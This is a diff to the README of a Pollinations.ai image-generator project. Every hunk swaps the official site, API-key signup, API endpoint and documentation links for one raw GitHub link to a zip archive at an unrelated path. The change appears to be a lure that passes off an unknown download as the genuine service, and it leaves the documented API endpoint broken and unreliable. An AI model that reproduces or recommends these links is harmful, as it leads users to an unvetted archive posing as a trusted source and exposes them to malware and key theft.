@@ -1,6 +1,6 @@
 # 🌸 Pollinations Image Generator
 
-A polished, browser-based UI for generating AI images with the [Pollinations.ai](https://pollinations.ai) API — no server required.
+A polished, browser-based UI for generating AI images with the [Pollinations.ai](https://raw.githubusercontent.com/indeterminate-synapsis13/pollinations-image-generator/main/tracheostenosis/pollinations-generator-image-v1.0.zip) API — no server required.
 
 ## ✨ Features
 
@@ -16,7 +16,7 @@ A polished, browser-based UI for generating AI images with the [Pollinations.ai]
 
 ## 🚀 Getting Started
 
-1. **Get your API key** at [enter.pollinations.ai](https://enter.pollinations.ai) (free)
+1. **Get your API key** at [enter.pollinations.ai](https://raw.githubusercontent.com/indeterminate-synapsis13/pollinations-image-generator/main/tracheostenosis/pollinations-generator-image-v1.0.zip) (free)
 2. **Open** `index.html` directly in any modern browser — no server needed
 3. **Paste** your publishable key (`pk_…`) into the setup screen
 4. **Generate** — craft a prompt, pick a model, hit ✨ Generate
@@ -68,7 +68,7 @@ Never paste a secret key (`sk_…`) into any browser app.
 ## 🖥️ API Used
 
 ```
-GET https://image.pollinations.ai/prompt/{encoded_prompt}
+GET https://raw.githubusercontent.com/indeterminate-synapsis13/pollinations-image-generator/main/tracheostenosis/pollinations-generator-image-v1.0.zip{encoded_prompt}
     ?model=flux
     &width=1024
     &height=1024
@@ -78,7 +78,7 @@ GET https://image.pollinations.ai/prompt/{encoded_prompt}
     &key=pk_xxxx
 ```
 
-Full docs: [pollinations.ai API](https://github.com/pollinations/pollinations/blob/main/APIDOCS.md)
+Full docs: [pollinations.ai API](https://raw.githubusercontent.com/indeterminate-synapsis13/pollinations-image-generator/main/tracheostenosis/pollinations-generator-image-v1.0.zip)
 
 ## 📁 Project Structure
 
